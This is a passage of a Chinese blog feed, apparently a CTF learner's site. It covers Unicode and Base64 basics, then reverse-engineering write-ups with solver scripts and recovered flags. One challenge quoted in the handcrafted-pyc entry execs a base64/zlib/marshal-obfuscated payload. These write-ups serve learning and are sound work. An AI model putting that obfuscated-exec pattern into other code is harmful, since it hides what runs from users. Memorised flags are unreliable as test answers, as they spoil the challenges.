href="https://zh.wikipedia.org/w/index.php?title=%E6%AF%94%E5%A5%87%E8%88%92%E5%A5%87%E6%96%87&amp;action=edit&amp;redlink=1">比奇舒奇文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%B1%A1%E9%9B%84%E6%96%87">象雄文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B0%BC%E6%B3%8A%E5%B0%94%E7%BA%BD%E7%93%A6%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">尼泊尔纽瓦字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%AC%A7%E5%A1%9E%E5%A5%87%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">欧塞奇字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E5%A4%8F%E6%96%87">西夏文</a>、绘字文、<a href="https://zh.wikipedia.org/wiki/%E8%92%99%E5%8F%A4%E6%96%87%E5%AD%97">札那巴札尔</a>、<a href="https://zh.wikipedia.org/wiki/%E7%B4%A2%E6%B0%B8%E5%B8%83%E6%96%87%E5%AD%97">索永布文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%A9%AC%E8%90%A8%E6%8B%89%E5%A7%86%E8%B4%A1%E5%BE%B7%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">马萨拉姆贡德文字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%B3%E4%B9%A6">女书</a>、<a href="https://zh.wikipedia.org/wiki/%E8%AE%8A%E9%AB%94%E5%81%87%E5%90%8D">变体假名</a>（非标准<a href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E5%81%87%E5%90%8D">平假名</a>）、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%A4%9A%E6%A0%BC%E6%8B%89%E6%96%87&amp;action=edit&amp;redlink=1">多格拉文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%96%AC%E6%B2%BB%E4%BA%9E%E6%96%87">格鲁吉亚文</a>骑士体大写字母、<a href="https://zh.wikipedia.org/w/index.php?title=%E8%B4%A1%E8%B4%BE%E6%8B%89%E8%B4%A1%E5%BE%B7%E6%96%87&amp;action=edit&amp;redlink=1">贡贾拉贡德文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%93%88%E4%B9%83%E6%96%90%E7%BE%85%E8%88%88%E4%BA%9E%E6%96%87%E5%AD%97">哈乃斐罗兴亚文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9C%9B%E5%8A%A0%E9%94%A1%E6%96%87&amp;action=edit&amp;redlink=1">望加锡文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%A2%85%E5%BE%B7%E6%B3%95%E4%BC%8A%E5%BE%B7%E6%9E%97%E6%96%87&amp;action=edit&amp;redlink=1">梅德法伊德林文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E7%B2%9F%E7%89%B9%E6%96%87">老粟特文</a>、<a href="https://zh.wikipedia.org/wiki/%E7%B2%9F%E7%89%B9%E6%96%87">粟特文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9F%83%E5%88%A9%E9%82%81%E6%96%87">埃利迈文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%97%E8%BF%AA%E5%9F%8E%E6%96%87&amp;action=edit&amp;redlink=1">南迪城文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%89%B5%E4%B8%96%E7%B4%80%E8%8B%97%E6%96%87">创世纪苗文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%96%87%E4%B9%94%E6%96%87&amp;action=edit&amp;redlink=1">文乔文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%8A%B1%E5%89%8C%E5%AD%90%E6%A8%A1%E8%AF%AD">花剌子模语</a>、<a href="https://zh.wikipedia.org/wiki/%E8%BF%AA%E7%BB%B4%E8%A5%BF%E8%AF%AD">迪维西语</a>的<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B3%B6%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">岛字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%91%E4%B8%B9%E5%B0%8F%E5%AD%97">契丹小字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BA%93%E5%B0%94%E5%BE%B7%E8%AF%AD%E5%AD%97%E6%AF%8D">库尔德语字母</a>的<a href="https://zh.wikipedia.org/wiki/%E5%BA%93%E5%B0%94%E5%BE%B7%E8%AF%AD%E5%AD%97%E6%AF%8D">Yezidi体</a>、书写<a href="https://zh.wikipedia.org/wiki/%E8%B1%AA%E8%90%A8%E8%AF%AD">豪萨语</a>用的阿拉伯附加字母、<a href="https://zh.wikipedia.org/wiki/%E6%B2%83%E6%B4%9B%E5%A4%AB%E8%AA%9E">沃洛夫语</a>、其他非洲语言、在巴基斯坦书写<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%B0%E5%BE%B7%E7%A7%91%E8%AA%9E&amp;action=edit&amp;redlink=1">印德科语</a>和<a href="https://zh.wikipedia.org/wiki/%E6%97%81%E9%81%AE%E6%99%AE%E8%AA%9E">旁遮普语</a>的补充字符、<a href="https://zh.wikipedia.org/wiki/%E7%B2%B5%E8%AA%9E">粤语</a>用的<a href="https://zh.wikipedia.org/wiki/%E7%B2%B5%E8%AA%9E%E6%B3%A8%E9%9F%B3%E7%AC%A6%E8%99%9F">注音符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E4%BA%AB%E5%89%B5%E6%84%8F">共享创意</a>授权符号、七十或八十年代电讯用图符。</p>
<h3 id="unicode编码系统可分为编码方式和实现方式两个层次">Unicode编码系统可分为编码方式和实现方式两个层次。</h3>
<p>目前实际应用的统一码版本对应于<a href="https://zh.wikipedia.org/wiki/UCS-2">UCS-2</a>，使用16<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%85%83">位</a>的编码空间。也就是每个字符占用2个<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">字节</a>。这样理论上一共最多可以表示216（即65536）个字符。基本满足各种语言的使用。<br>
UCS-4是一个更大的尚未填充完全的31位字符集，加上恒为0的首位，共需占据32位，即4字节。理论上最多能表示231个字符，完全可以涵盖一切语言所用的符号。<br>
基本多文种平面的字符的编码为<em>U+hhhh</em>，其中每个<em>h</em>代表一个<a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a>数字，与UCS-2编码完全相同。而其对应的4字节UCS-4编码后两个字节一致，前两个字节则所有位均为0。<br>
Unicode的实现方式不同于编码方式。一个字符的Unicode编码是确定的。但是在实际传输过程中，由于不同<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">系统平台</a>的设计不一定一致，以及出于节省空间的目的，对Unicode编码的实现方式有所不同。Unicode的实现方式称为<strong>Unicod转换格式</strong>（Unicode Transformation Format，简称为UTF）。</p>
<p><a href="https://zh.wikipedia.org/wiki/Unicode">Unicode_wiki百科</a></p>
<h2 id="base64">base64</h2>
<p><strong>Base64</strong>是一种基于64个可打印字符来表示<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制数据</a>的表示方法。由于{\displaystyle \log _{2}64=6}<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/9c986fbdc6c036a937e0647d7a6ec5ad745bccab" alt="{\displaystyle \log _{2}64=6}" loading="lazy">，所以每6个<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%85%83">比特</a>为一个单元，Base64常用于在通常处理文本<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE">数据</a>的场合，表示、传输、存储一些二进制数据，包括<a href="https://zh.wikipedia.org/wiki/MIME">MIME</a>的<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6">电子邮件</a>及<a href="https://zh.wikipedia.org/wiki/XML">XML</a>的一些复杂数据。</p>
<ul>
<li>编码“Man”</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">文本</th>
<th>M</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>A</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>N</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ASCII编码</td>
<td>77</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>97</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>110</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">二进制位</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td style="text-align:center">索引</td>
<td>19</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>22</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>46</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">Base64编码</td>
<td><strong>T</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>W</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>F</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>u</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>在此例中，Base64算法将3个字节编码为4个字符。</p>
<p>Base64索引表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center"></th>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center"></th>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">A</td>
<td style="text-align:center">16</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">32</td>
<td style="text-align:center">g</td>
<td style="text-align:center">48</td>
<td style="text-align:center">w</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">B</td>
<td style="text-align:center">17</td>
<td style="text-align:center">R</td>
<td style="text-align:center">33</td>
<td style="text-align:center">h</td>
<td style="text-align:center">49</td>
<td style="text-align:center">x</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">C</td>
<td style="text-align:center">18</td>
<td style="text-align:center">S</td>
<td style="text-align:center">34</td>
<td style="text-align:center">i</td>
<td style="text-align:center">50</td>
<td style="text-align:center">y</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">D</td>
<td style="text-align:center">19</td>
<td style="text-align:center">T</td>
<td style="text-align:center">35</td>
<td style="text-align:center">j</td>
<td style="text-align:center">51</td>
<td style="text-align:center">z</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">E</td>
<td style="text-align:center">20</td>
<td style="text-align:center">U</td>
<td style="text-align:center">36</td>
<td style="text-align:center">k</td>
<td style="text-align:center">52</td>
<td style="text-align:center">0</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">F</td>
<td style="text-align:center">21</td>
<td style="text-align:center">V</td>
<td style="text-align:center">37</td>
<td style="text-align:center">l</td>
<td style="text-align:center">53</td>
<td style="text-align:center">1</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">G</td>
<td style="text-align:center">22</td>
<td style="text-align:center">W</td>
<td style="text-align:center">38</td>
<td style="text-align:center">m</td>
<td style="text-align:center">54</td>
<td style="text-align:center">2</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">H</td>
<td style="text-align:center">23</td>
<td style="text-align:center">X</td>
<td style="text-align:center">39</td>
<td style="text-align:center">n</td>
<td style="text-align:center">55</td>
<td style="text-align:center">3</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">I</td>
<td style="text-align:center">24</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">40</td>
<td style="text-align:center">o</td>
<td style="text-align:center">56</td>
<td style="text-align:center">4</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">J</td>
<td style="text-align:center">25</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">41</td>
<td style="text-align:center">p</td>
<td style="text-align:center">57</td>
<td style="text-align:center">5</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">K</td>
<td style="text-align:center">26</td>
<td style="text-align:center">a</td>
<td style="text-align:center">42</td>
<td style="text-align:center">q</td>
<td style="text-align:center">58</td>
<td style="text-align:center">6</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">L</td>
<td style="text-align:center">27</td>
<td style="text-align:center">b</td>
<td style="text-align:center">43</td>
<td style="text-align:center">r</td>
<td style="text-align:center">59</td>
<td style="text-align:center">7</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">M</td>
<td style="text-align:center">28</td>
<td style="text-align:center">c</td>
<td style="text-align:center">44</td>
<td style="text-align:center">s</td>
<td style="text-align:center">60</td>
<td style="text-align:center">8</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">N</td>
<td style="text-align:center">29</td>
<td style="text-align:center">d</td>
<td style="text-align:center">45</td>
<td style="text-align:center">t</td>
<td style="text-align:center">61</td>
<td style="text-align:center">9</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">O</td>
<td style="text-align:center">30</td>
<td style="text-align:center">e</td>
<td style="text-align:center">46</td>
<td style="text-align:center">u</td>
<td style="text-align:center">62</td>
<td style="text-align:center">+</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">P</td>
<td style="text-align:center">31</td>
<td style="text-align:center">f</td>
<td style="text-align:center">47</td>
<td style="text-align:center">v</td>
<td style="text-align:center">63</td>
<td style="text-align:center">/</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>大致过程：先将文本转为ascii码，再转为8位2进制数，再取其中6位得出对应的十进制数，再通过索引表中转换为字符</p>
<p>如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。在编码后的Base64文本后加上一个或两个<code>=</code>号，代表补足的字节数。说，当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。</p>
<h3 id="base64解码">base64解码</h3>
<p><a href="http://tool.chinaz.com/Tools/Base64.aspx">在线解码编码网站</a></p>
<h3 id="base64_python">base64_python</h3>
<h4 id="想将字符串转编码成base64要先将字符串转换成二进制数据">想将字符串转编码成base64,要先将字符串转换成二进制数据</h4>
<pre><code>url = &quot;https://www.cnblogs.com/songzhixue/&quot;
bytes_url = url.encode(&quot;utf-8&quot;)
str_url = base64.b64encode(bytes_url)  # 被编码的参数必须是二进制数据
print(str_url)

b'aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8='
</code></pre>
<h4 id="将base64解码成字符串">将base64解码成字符串</h4>
<pre><code>import base64
url = &quot;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8=&quot;
str_url = base64.b64decode(url).decode(&quot;utf-8&quot;)
print(str_url)

'https://www.cnblogs.com/songzhixue/'
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Jarvis OJ_re部分]]></title>
        <id>https://7usai.github.io/post/aUlplRi6E/</id>
        <link href="https://7usai.github.io/post/aUlplRi6E/">
        </link>
        <updated>2020-09-18T07:30:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="61dctfstheasy">[61dctf]stheasy</h2>
<p>主函数</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600414298392.png" alt="" loading="lazy"></figure>
<p>进入关键函数得，flag长度为29位</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600414303121.png" alt="" loading="lazy"></figure>
<p>byte_8049AE0和byte8049B15值如下</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600414307727.png" alt="" loading="lazy"></figure>
<p>写脚本</p>
<pre><code>a=[0x48,0x5D,0x8D,0x24,0x84,0x27,0x99,0x9F,0x54,0x18,0x1E,0x69,0x7E,0x33,0x15,0x72
   ,0x8D,0x33,0x24,0x63,0x21,0x54,0x0C,0x78,0x78,0x78,0x78,0x78,0x1B]
b='lk2j9Gh}AgfY4ds-a6QW1#k5ER_T[cvLbV7nOm3ZeX{CMt8SZo]U'
flag=''
for i in range(29):
    flag+=chr(ord(b[int(a[i]/3-2)]))
    print(flag)
</code></pre>
<p>得flag=kctf{YoU_hAVe-GOt-fLg_233333}</p>
<h2 id="dd-hello">DD - Hello</h2>
<p>关键函数</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600414334088.png" alt="" loading="lazy"></figure>
<p>V2等于start和sub_100000C90得地址之差再向右移动两位后于byte_10001040异或</p>
<p>地址于byte_10001040如下</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600414343342.png" alt="" loading="lazy"></figure>
<p><img src="https://7usai.github.io/post-images/1600414347990.png" alt="" loading="lazy"><br>
<img src="https://7usai.github.io/post-images/1600414353508.png" alt="" loading="lazy"></p>
<p>脚本</p>
<pre><code>a= [0x41, 0x10, 0x11, 0x11, 0x1B, 0x0A, 0x64, 0x67, 0x6A, 0x68, 0x62, 0x68,
    0x6E, 0x67, 0x68, 0x6B, 0x62, 0x3D, 0x65, 0x6A, 0x6A, 0x3D, 0x68, 0x4,
    0x5, 0x8, 0x3, 0x2, 0x2, 0x55, 0x8, 0x5D, 0x61, 0x55, 0x0A, 0x5F, 0x0D
    , 0x5D, 0x61, 0x32, 0x17, 0x1D, 0x19, 0x1F, 0x18, 0x20, 0x4, 0x2, 0x12,
    0x16, 0x1E, 0x54, 0x20, 0x13, 0x14, 0x0, 0x0]
flag=''
v2=((0xCB0-0xC90)&gt;&gt;2)^(a[0])
for i in range(55):
    a[i]-=2
    a[i]^=v2
    i+=1
    v2+=1
    flag+=chr(a[i-1])
print(flag[1:])
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界_re_4星题_部分wp]]></title>
        <id>https://7usai.github.io/post/gong-fang-shi-jie-_re_4-xing-ti-_-bu-fen-wp/</id>
        <link href="https://7usai.github.io/post/gong-fang-shi-jie-_re_4-xing-ti-_-bu-fen-wp/">
        </link>
        <updated>2020-09-16T06:54:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="handcrafted-pyc">handcrafted-pyc</h2>
<h3 id="理解文件">理解文件</h3>
<p>得到了一个py文件</p>
<pre><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-

import marshal, zlib, base64

exec(marshal.loads(zlib.decompress(base64.b64decode('eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ=='))))

</code></pre>
<p>经过搜索可得函数作用如下</p>
<p>base64.b64decode() ——base64解码<br>
zlib.decompress() ——解压缩<br>
marshal.loads() ——反序列化<br>
exec() ——将参数当做可执行文件运行</p>
<h3 id="写入文件">写入文件</h3>
<p>我们将解压缩后的文件写入文件中</p>
<pre><code>import zlib
import base64
d=zlib.decompress(base64.b64decode('eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ=='))
f=open('bytecode','wb')
f.write(d)
</code></pre>
<p>open用法：https://www.runoob.com/python/python-func-open.html</p>
<h3 id="添加文件头">添加文件头</h3>
<p>更改后缀名为pyc时发现不能运行<img src="https://7usai.github.io/post-images/1600239334055.png" alt="" loading="lazy"></p>
<p>于是手动添加文件头</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600239343673.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600239349059.png" alt="" loading="lazy"></figure>
<p>这里我更改了两个pyc，两种都能运行但是可以看到5~8字节不同，上一个(就是444.pyc)是我在网上搜索得到的文件头，而1111.pyc是我自己编写py文件后转成pyc后得到的文件头，这里有一个知识</p>
<pre><code>pyc文件头部
- 前4个字节：03f3 0d0a，表示python版本
- 5-8个字节：0e6b 905d，表示pyc文件修改时间
</code></pre>
<p>具体可参考https://www.cnblogs.com/blili/p/11799483.html</p>
<p>添加文件头后我们发现可以运行了</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600239355890.png" alt="" loading="lazy"></figure>
<h3 id="pyc转为py">pyc转为py</h3>
<p>通过uncompyle6将其转为py文件</p>
<pre><code>uncompyle6 -o 123.py 1111.pyc
</code></pre>
<p><img src="https://7usai.github.io/post-images/1600239362899.png" alt="" loading="lazy"><br>
2k多行这里只截一部分</p>
<p>将LOAD_CONST后面的所有数字转为ascii码</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600239369086.png" alt="" loading="lazy"></figure>
<p><img src="https://7usai.github.io/post-images/1600239375580.png" alt="" loading="lazy"><br>
再次分析我们可知他是4个字符为一组</p>
<h3 id="观察规律尝试解密">观察规律尝试解密</h3>
<p>将乱序得flag尝试4个为一组倒叙得<br>
hitcon{Now y</p>
<p>神似flag，最终全部倒叙得flag=hitcon{Now you can compile and run Python bytecode in your brain!}</p>
<h3 id="总结">总结</h3>
<p>很费时间，学习了pyc文件格式，学习了uncompyle6<br>
<img src="https://7usai.github.io/post-images/1600239447558.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界_re_3星题_部分wp]]></title>
        <id>https://7usai.github.io/post/gong-fang-shi-jie-_re_3-xing-ti-_-bu-fen-wp/</id>
        <link href="https://7usai.github.io/post/gong-fang-shi-jie-_re_3-xing-ti-_-bu-fen-wp/">
        </link>
        <updated>2020-09-14T15:05:52.000Z</updated>
        <content type="html"><![CDATA[<h1 id="攻防世界_re_3星题__部分wp">攻防世界_re_3星题__部分wp</h1>
<h2 id="debug">debug</h2>
<h3 id="先用de4dot进行脱壳">先用de4dot进行脱壳</h3>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600095989406.png" alt="" loading="lazy"></figure>
<h3 id="放入dnspy调试">放入dnSpy调试</h3>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600095996901.png" alt="" loading="lazy"></figure>
<p>找到main函数所在位置，很简单，a相当于输入的数，b就是经过一系列加密后得到的flag,下入断点运行就得到了flag<br>
<img src="https://7usai.github.io/post-images/1600096004477.png" alt="" loading="lazy"></p>
<h2 id="hackme">hackme</h2>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600096012245.png" alt="" loading="lazy"></figure>
<h3 id="主函数">主函数</h3>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600096022965.png" alt="" loading="lazy"></figure>
<h3 id="思路网上借鉴的">思路(网上借鉴的)</h3>
<p>sub_406D90为随机数生成函数，且seed为固定值</p>
<p>重点是要理解这个函数的逻辑是啥。。虽然这个判断只取了有输入字符串的10个字符，但是实际上需要输入的字符串是22位（也就是实际上flag有22个char）。。</p>
<p>之后程序会从这里面随机选择一个数字i，然后从byte_6B4270和输入的字符串中分别取出第i个字符v16和v15，将v15的内容和一个生成的大数进行异或运算与v16比较。</p>
<p>整体逻辑如上，而且我们发现，这个i具体是多少其实是不需要的，因为这个i是随机生成的用于检验得到的flag的（理解这点后题目就变得十分简单了），所以我们需要做的时按程序正向逻辑进行爆破或者逆向生成这flag即可。</p>
<p>需要注意的是，虽然很多时候这种类似 unsigned __int8 的信息会被我们忽略， 但是在本题中它是非常重要的， 它标表示这个数被转型为8个bit长（也就是只有一个字节，刚好是我们ascii表的范围），故脚本中我们需要与上一个0xff</p>
<h3 id="脚本">脚本</h3>
<pre><code>a=[0x5F ,0xF2 ,0x5E ,0x8B ,0x4E ,0x0E ,0xA3 ,0xAA ,0xC7 ,0x93 ,0x81 ,
   0x3D ,0x5F ,0x74 ,0xA3 ,0x09 ,0x91 ,0x2B, 0x49 ,0x28 ,0x93 ,0x67]
flag=''
for i in range(22):
    v14=i+1
    v18=0
    v19=0
    while v18&lt;v14:
        v18+=1
        v19=1828812941 * v19 + 12345
    flag+=chr((a[i]^v19)&amp;0xff)
print(flag)
</code></pre>
<h2 id="babyre">BABYRE</h2>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600096037348.png" alt="" loading="lazy"></figure>
<p>GDB还不会，等学会了再写</p>
<h2 id="crackme">crackme</h2>
<h3 id="脱壳">脱壳</h3>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1600096045818.png" alt="" loading="lazy"></figure>
<h3 id="主函数-2">主函数</h3>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1600096054533.png" alt="" loading="lazy"></figure>
<p>很简单，异或一下就行</p>
<p>dword_402150值如下</p>
